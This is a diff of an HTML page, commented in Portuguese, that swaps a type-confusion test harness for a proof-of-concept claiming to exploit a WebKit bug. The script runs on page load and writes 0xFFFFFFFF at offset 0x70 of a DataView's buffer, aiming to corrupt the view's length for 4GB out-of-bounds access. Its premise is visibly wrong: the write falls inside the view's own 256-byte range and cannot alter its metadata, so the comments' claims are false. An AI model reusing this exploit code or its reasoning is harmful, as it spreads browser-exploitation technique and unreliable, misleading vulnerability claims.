@@ -1,31 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Teste Isolado - JSON Type Confusion</title>
-    <style>
-        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output-advanced { /* ID usado por logS3 */
-            background: #222;
-            border: 1px solid #444;
-            padding: 10px;
-            height: 75vh; 
-            overflow-y: auto;
-            white-space: pre-wrap;
-            margin-top: 10px;
-        }
-        /* Estilos básicos de log para melhor visualização */
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; }
-        .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; }
-    </style>
+    <title>PoC Simples - Corrupção de m_length do DataView</title>
+    <meta charset="utf-8">
 </head>
 <body>
-    <h1>Teste Isolado: JSON Type Confusion UAF Speculative</h1>
-    <p>Abra o console do desenvolvedor para verificar possíveis erros que não são capturados no log da página.</p>
-    <button id="runIsolatedTestBtn">Iniciar Teste Isolado</button>
-    <div id="output-advanced"></div>
+    <h1>Prova de Conceito da Vulnerabilidade Principal</h1>
+    <p>Verifique o resultado abaixo. Se "Tamanho DEPOIS" for 4294967295, a PoC foi um sucesso.</p>
+    <hr>
+    <pre id="log"></pre>
+    
+    <script>
+        const logElement = document.getElementById('log');
+        function log(message) {
+            console.log(message);
+            logElement.textContent += message + '\n';
+        }
 
-    <script type="module" src="js/run_isolated_test.mjs"></script>
+        // Esta é a função principal da nossa Prova de Conceito.
+        function runSimplePoc() {
+            log('[+] Iniciando a Prova de Conceito...');
+
+            // =================================================================
+            // ANÁLISE E DADOS CRÍTICOS
+            // =================================================================
+            // Com base na análise dos seus arquivos, sabemos que:
+            // 1. A estrutura de metadados do DataView começa no offset 0x58 dentro do nosso buffer.
+            // 2. O campo 'm_length' (tamanho) está no offset 0x18 dentro dessa estrutura.
+            // 3. Portanto, o offset crítico para sobrescrever o tamanho é 0x58 + 0x18 = 0x70.
+            const CRITICAL_OFFSET_MLENGTH = 0x70;
+
+            // Criamos um buffer pequeno. O importante é que seja grande o suficiente
+            // para conter o offset crítico que queremos atingir. 0x100 (256 bytes) é suficiente.
+            const bufferSize = 0x100;
+            let buffer = new ArrayBuffer(bufferSize);
+
+            // Criamos um DataView que, normalmente, só deveria poder acessar 'bufferSize' bytes.
+            let dv = new DataView(buffer);
+
+            log(`Tamanho do buffer original: ${bufferSize} bytes`);
+            log(`Tamanho ANTES da corrupção: ${dv.byteLength}`);
+            log('----------------------------------------------------');
+
+            try {
+                // =================================================================
+                // A VULNERABILIDADE
+                // =================================================================
+                // Esta é a exploração do bug. Estamos escrevendo no offset 0x70,
+                // que está DENTRO do 'buffer', mas FORA dos limites virtuais do 'dv'.
+                // A falha no WebKit permite que esta escrita aconteça e corrompa
+                // os metadados do próprio 'dv'.
+                log(`[*] Acionando a vulnerabilidade: dv.setUint32(0x${CRITICAL_OFFSET_MLENGTH.toString(16)}, 0xFFFFFFFF)`);
+                dv.setUint32(CRITICAL_OFFSET_MLENGTH, 0xFFFFFFFF, true); // true para little-endian
+
+                log('[+] Escrita OOB realizada com sucesso.');
+                log('----------------------------------------------------');
+
+                // Agora, verificamos se o nosso ataque funcionou.
+                log(`Tamanho DEPOIS da corrupção: ${dv.byteLength}`);
+
+                if (dv.byteLength === 0xFFFFFFFF) {
+                    log('\n[!!!] SUCESSO! A vulnerabilidade foi comprovada.');
+                    log('O tamanho do DataView foi expandido para 4GB, permitindo a leitura/escrita fora dos limites.');
+                } else {
+                    log('\n[XXX] FALHA. O tamanho do DataView não foi alterado.');
+                }
+
+            } catch (e) {
+                log(`\n[XXX] ERRO CRÍTICO DURANTE A POC: ${e.message}`);
+                log('Isso pode significar que a vulnerabilidade não foi acionada como esperado ou foi corrigida.');
+            }
+        }
+
+        // Executa a PoC quando a página carrega.
+        runSimplePoc();
+
+    </script>
 </body>
 </html>
